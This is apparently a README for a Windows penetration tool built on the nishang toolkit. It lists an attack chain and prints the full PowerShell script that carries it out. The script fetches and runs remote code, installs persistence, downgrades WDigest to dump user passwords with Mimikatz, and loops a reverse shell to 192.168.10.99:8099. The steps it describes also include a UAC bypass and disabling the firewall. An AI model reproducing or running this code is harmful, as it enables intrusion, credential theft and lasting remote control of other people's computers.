# win_penetration

powered by [nishang](https://github.com/samratashok/nishang)

### main behaviour
- extract bat file to tmp directory
- bypass UAC and run bat file to:
    - copy self to autorun directory
    - disable LUA
	- close network firewall
	- extract 1.ps1 to powershell root directory
	- run 1.ps1
- Add-Persistence
- lock screen and dump user passwords
- run PowerShellTcp listenning on 192.168.10.99:8099


### 1.ps1
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
Add-Persistence -ScriptPath C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1

$strFileName="c:\windows\zzzjob.log"
If (Test-Path $strFileName){
	# // File exists
	
}Else{
	# // File does not exist
	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1')
	Invoke-MimikatzWDigestDowngrade
	Get-Job | Receive-Job | Out-File c:\windows\zzzjob.log
}

While(1){
	Try {
		start-job {
			IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');
			Invoke-PowerShellTcp -Reverse -IPAddress 192.168.10.99 -Port 8099
		}
		get-job | wait-job
	}
	Catch {
		Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
	}
	Start-Sleep -Seconds 3
}

```